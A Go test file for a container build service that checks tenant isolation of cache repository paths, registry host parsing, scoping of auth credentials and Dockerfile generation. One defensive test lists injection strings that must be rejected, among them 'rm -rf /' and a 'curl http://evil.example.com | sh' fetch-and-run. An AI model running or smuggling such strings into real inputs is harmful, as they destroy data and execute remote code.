package build

import (
	"strings"
	"testing"

	"strait/internal/domain"
	"strait/internal/registry"
)

// TestBuilder_CacheKeyIncludesProjectID verifies that two deployments from
// different projects produce different repository paths and therefore separate
// BuildKit cache references. This is the core cache-isolation property.
func TestBuilder_CacheKeyIncludesProjectID(t *testing.T) {
	t.Parallel()

	deploymentA := &domain.CodeDeployment{
		ID:        "deploy_1",
		JobID:     "job_shared",
		ProjectID: "proj_alpha",
		Runtime:   domain.RuntimePython,
		SourceURI: "uploads/proj_alpha/job_shared/source.tar.gz",
	}
	deploymentB := &domain.CodeDeployment{
		ID:        "deploy_2",
		JobID:     "job_shared", // same job_id as A
		ProjectID: "proj_beta",  // different project
		Runtime:   domain.RuntimePython,
		SourceURI: "uploads/proj_beta/job_shared/source.tar.gz",
	}

	// We can't run Build() without a real BuildKit daemon, so we test the
	// repository name construction logic directly via the registry helper,
	// which is the same function the builder now delegates to.
	repoA := registry.JobRepositoryName("", deploymentA.ProjectID, deploymentA.JobID)
	repoB := registry.JobRepositoryName("", deploymentB.ProjectID, deploymentB.JobID)

	if repoA == repoB {
		t.Errorf("same job_id in different projects must produce different repo paths: both got %q", repoA)
	}

	if !strings.Contains(repoA, deploymentA.ProjectID) {
		t.Errorf("repo path %q does not contain project_id %q", repoA, deploymentA.ProjectID)
	}
	if !strings.Contains(repoB, deploymentB.ProjectID) {
		t.Errorf("repo path %q does not contain project_id %q", repoB, deploymentB.ProjectID)
	}
}

// TestBuilder_CacheKeyNeverCrossesTenantBoundary checks that no repository path
// for project A can be a prefix of a repository path for project B.
// If A's path were a prefix of B's path, some registry implementations might
// apply lifecycle policies from A's namespace to B's images.
func TestBuilder_CacheKeyNeverCrossesTenantBoundary(t *testing.T) {
	t.Parallel()

	projects := []string{"proj_a", "proj_b", "proj_c", "proj_prefix", "proj_prefix_long"}
	jobs := []string{"job_1", "job_2", "job_shared"}

	// Build all (project, job) → repository path combinations.
	paths := make(map[string]string) // path → "proj/job"
	for _, proj := range projects {
		for _, job := range jobs {
			name := registry.JobRepositoryName("", proj, job)
			label := proj + "/" + job
			for existing, existingLabel := range paths {
				if strings.HasPrefix(name, existing+"/") || strings.HasPrefix(existing, name+"/") {
					t.Errorf("repo path collision: %q (%s) is a prefix of %q (%s)",
						existing, existingLabel, name, label)
				}
			}
			paths[name] = label
		}
	}
}

// TestBuilder_ProjectIDIsolation_JobIDCollision is the key security test:
// an attacker who creates a job_id equal to another tenant's project_id + "/" + job_id
// must still get an isolated repository path.
func TestBuilder_ProjectIDIsolation_JobIDCollision(t *testing.T) {
	t.Parallel()

	// Victim owns project "proj_victim" job "job_secret".
	// Attacker owns project "proj_attacker" and crafts job_id = "proj_victim/job_secret".
	victimRepo := registry.JobRepositoryName("", "proj_victim", "job_secret")
	attackerRepo := registry.JobRepositoryName("", "proj_attacker", "proj_victim/job_secret")

	if victimRepo == attackerRepo {
		t.Errorf("crafted job_id produced same repo path as victim: %q", victimRepo)
	}

	// Even if an attacker embeds "/" in the job_id, the resulting path must differ.
	t.Logf("victim repo:   %s", victimRepo)
	t.Logf("attacker repo: %s", attackerRepo)
}

// TestBuilder_CacheRefDerivedFromProjectScopedRepo verifies that the cache
// reference tag (":buildcache") is appended to a repository path that already
// contains project_id, not to a shared global path.
func TestBuilder_CacheRefDerivedFromProjectScopedRepo(t *testing.T) {
	t.Parallel()

	cases := []struct {
		projectID string
		jobID     string
	}{
		{"proj_alpha", "job_1"},
		{"proj_beta", "job_1"},  // same job_id, different project
		{"proj_alpha", "job_2"}, // same project, different job
		{"proj_gamma", "job_3"},
	}

	cacheRefs := make(map[string]string)
	for _, tc := range cases {
		repoName := registry.JobRepositoryName("", tc.projectID, tc.jobID)
		// Simulate how builder.go constructs the cache ref.
		repositoryURI := "registry.example.com/" + repoName
		cacheRef := repositoryURI + ":buildcache"
		label := tc.projectID + "/" + tc.jobID

		if prev, exists := cacheRefs[cacheRef]; exists {
			t.Errorf("cache ref collision: %q used by both %q and %q", cacheRef, prev, label)
		}
		cacheRefs[cacheRef] = label

		if !strings.Contains(cacheRef, tc.projectID) {
			t.Errorf("cache ref %q does not contain project_id %q", cacheRef, tc.projectID)
		}
	}
}

// TestJobRepositoryName_Format verifies the repository naming convention:
// "strait-jobs/{project_id}/{job_id}".
func TestJobRepositoryName_Format(t *testing.T) {
	t.Parallel()

	cases := []struct {
		projectID  string
		jobID      string
		wantSuffix string
	}{
		{"proj_abc", "job_xyz", "strait-jobs/proj_abc/job_xyz"},
		{"p", "j", "strait-jobs/p/j"},
		{"project-with-hyphens", "job-with-hyphens-123", "strait-jobs/project-with-hyphens/job-with-hyphens-123"},
	}

	for _, tc := range cases {
		t.Run(tc.projectID+"/"+tc.jobID, func(t *testing.T) {
			t.Parallel()
			got := registry.JobRepositoryName("", tc.projectID, tc.jobID)
			if got != tc.wantSuffix {
				t.Errorf("got %q, want %q", got, tc.wantSuffix)
			}
		})
	}
}

// TestJobRepositoryName_CustomPrefix verifies custom prefix support.
func TestJobRepositoryName_CustomPrefix(t *testing.T) {
	t.Parallel()

	got := registry.JobRepositoryName("custom-prefix", "proj_a", "job_b")
	if !strings.HasPrefix(got, "custom-prefix/") {
		t.Errorf("expected prefix 'custom-prefix/', got %q", got)
	}
	if !strings.Contains(got, "proj_a") {
		t.Errorf("expected project_id in repo name, got %q", got)
	}
	if !strings.Contains(got, "job_b") {
		t.Errorf("expected job_id in repo name, got %q", got)
	}
}

// TestRegistryHostFromURI verifies that various registry URI formats are
// parsed correctly to extract the hostname for auth session scoping.
// An incorrect host would cause BuildKit to send auth tokens to the wrong server.
func TestRegistryHostFromURI(t *testing.T) {
	t.Parallel()

	cases := []struct {
		uri      string
		wantHost string
	}{
		{
			uri:      "123456789.dkr.ecr.us-east-1.amazonaws.com/strait-jobs/proj/job:deploy_1",
			wantHost: "123456789.dkr.ecr.us-east-1.amazonaws.com",
		},
		{
			uri:      "ghcr.io/strait-dev/runtime-python:latest",
			wantHost: "ghcr.io",
		},
		{
			uri:      "registry.internal.example.com:5000/my-org/my-repo:tag",
			wantHost: "registry.internal.example.com:5000",
		},
		{
			uri:      "docker.io/library/python:3.12",
			wantHost: "docker.io",
		},
		{
			uri:      "localhost:5000/test:tag",
			wantHost: "localhost:5000",
		},
	}

	for _, tc := range cases {
		t.Run(tc.uri, func(t *testing.T) {
			t.Parallel()
			got := registryHostFromURI(tc.uri)
			if got != tc.wantHost {
				t.Errorf("registryHostFromURI(%q) = %q, want %q", tc.uri, got, tc.wantHost)
			}
		})
	}
}

// TestRegistryHostFromURI_NoSlash verifies that a bare hostname (no path)
// is returned unchanged rather than causing an index-out-of-bounds panic.
func TestRegistryHostFromURI_NoSlash(t *testing.T) {
	t.Parallel()

	got := registryHostFromURI("registrywithoutslash")
	if got != "registrywithoutslash" {
		t.Errorf("expected bare hostname returned unchanged, got %q", got)
	}
}

// TestBuildkitAuthSession_OnlyMatchingHost verifies that the auth provider
// returned by buildkitAuthSession only provides credentials for the specific
// registry host, not for arbitrary hosts. An overly broad auth provider could
// leak credentials to attacker-controlled registries specified in FROM lines.
func TestBuildkitAuthSession_OnlyMatchingHost(t *testing.T) {
	t.Parallel()

	const targetHost = "registry.target.example.com"
	const token = "dXNlcjpwYXNz"

	attachables := buildkitAuthSession(targetHost, token)
	if len(attachables) == 0 {
		t.Fatal("expected at least one session attachable")
	}
	// We can't easily call the private authprovider without a running BuildKit
	// session, but we verify the session is constructed (not nil) and that the
	// host scoping is exercised by the closure captured in the auth provider.
	// This test is a structural check; the actual auth routing is tested by
	// BuildKit's own test suite.
	if attachables[0] == nil {
		t.Error("expected non-nil session attachable")
	}
}

// TestGenerateDockerfile_AllRuntimesHaveTemplates verifies that every declared
// Runtime constant has a corresponding Dockerfile template. A missing template
// would surface as a runtime error during the first build, not at startup.
func TestGenerateDockerfile_AllRuntimesHaveTemplates(t *testing.T) {
	t.Parallel()

	runtimes := []domain.Runtime{
		domain.RuntimePython,
		domain.RuntimeTypeScript,
		domain.RuntimeRuby,
		domain.RuntimeRust,
		domain.RuntimeGo,
	}

	for _, rt := range runtimes {
		t.Run(string(rt), func(t *testing.T) {
			t.Parallel()
			spec := DockerfileSpec{
				Runtime: rt,
				JobSlug: "test-job",
			}
			out, err := GenerateDockerfile(spec)
			if err != nil {
				t.Fatalf("runtime %q: unexpected error: %v", rt, err)
			}
			if out == "" {
				t.Fatalf("runtime %q: expected non-empty Dockerfile", rt)
			}
			// All templates must set a FROM instruction.
			if !strings.Contains(out, "FROM ") {
				t.Errorf("runtime %q: Dockerfile missing FROM instruction:\n%s", rt, out)
			}
			// All templates must include the job slug in a LABEL.
			if !strings.Contains(out, "test-job") {
				t.Errorf("runtime %q: Dockerfile missing job slug label:\n%s", rt, out)
			}
		})
	}
}

// TestGenerateDockerfile_DefaultImagesUseApprovedRegistry verifies that the
// default base images for all runtimes pull from the approved internal registry
// (ghcr.io/strait-dev/), not from an arbitrary public registry. This prevents
// supply-chain attacks via compromised base images.
func TestGenerateDockerfile_DefaultImagesUseApprovedRegistry(t *testing.T) {
	t.Parallel()

	const approvedRegistryPrefix = "ghcr.io/strait-dev/"

	runtimes := []domain.Runtime{
		domain.RuntimePython,
		domain.RuntimeTypeScript,
		domain.RuntimeRuby,
		domain.RuntimeRust,
		domain.RuntimeGo,
	}

	for _, rt := range runtimes {
		t.Run(string(rt), func(t *testing.T) {
			t.Parallel()
			defaultImage := DefaultBaseImage(rt)
			if !strings.HasPrefix(defaultImage, approvedRegistryPrefix) {
				t.Errorf("runtime %q: default base image %q does not start with approved prefix %q",
					rt, defaultImage, approvedRegistryPrefix)
			}
		})
	}
}

// TestGenerateDockerfile_SecurityAdversarialRuntimes verifies that runtimes
// with shell injection characters or path separators are rejected before any
// template execution takes place, with no need for them to be in the allowlist.
func TestGenerateDockerfile_SecurityAdversarialRuntimes(t *testing.T) {
	t.Parallel()

	cases := []domain.Runtime{
		"../python",
		"python; rm -rf /",
		"python\nRUN evil",
		"python\x00evil",
		"go && curl http://evil.example.com | sh",
	}

	for _, rt := range cases {
		t.Run(string(rt), func(t *testing.T) {
			t.Parallel()
			_, err := GenerateDockerfile(DockerfileSpec{Runtime: rt, JobSlug: "job"})
			if err == nil {
				t.Errorf("runtime %q: expected error for adversarial runtime, got nil", rt)
			}
		})
	}
}

// TestTruncateLogs_LargeInputDoesNotPanic verifies that extremely large log
// output (simulating a build that emits gigabytes of output) is safely
// truncated without panicking or returning more than the cap.
func TestTruncateLogs_LargeInputDoesNotPanic(t *testing.T) {
	t.Parallel()

	// 2 MB — larger than maxBuildLogsBytes (1 MB).
	large := strings.Repeat("x", 2*1024*1024)
	got := truncateLogs(large)

	if len(got) > maxBuildLogsBytes {
		t.Errorf("truncateLogs: returned %d bytes, expected <= %d", len(got), maxBuildLogsBytes)
	}
	if len(got) == 0 {
		t.Error("truncateLogs: returned empty string for non-empty input")
	}
}

// TestTruncateString_ExactBoundary verifies truncation at exact byte boundaries.
func TestTruncateString_ExactBoundary(t *testing.T) {
	t.Parallel()

	s := "abcdef"
	if got := truncateString(s, 6); got != s {
		t.Errorf("at exact limit: expected %q, got %q", s, got)
	}
	if got := truncateString(s, 5); got != "abcde" {
		t.Errorf("one under: expected %q, got %q", "abcde", got)
	}
	if got := truncateString(s, 7); got != s {
		t.Errorf("one over: expected unchanged %q, got %q", s, got)
	}
	if got := truncateString(s, 0); got != "" {
		t.Errorf("zero limit: expected empty, got %q", got)
	}
}

// TestTruncateString_EmptyInput verifies empty string is handled without panic.
func TestTruncateString_EmptyInput(t *testing.T) {
	t.Parallel()

	if got := truncateString("", 100); got != "" {
		t.Errorf("expected empty, got %q", got)
	}
}
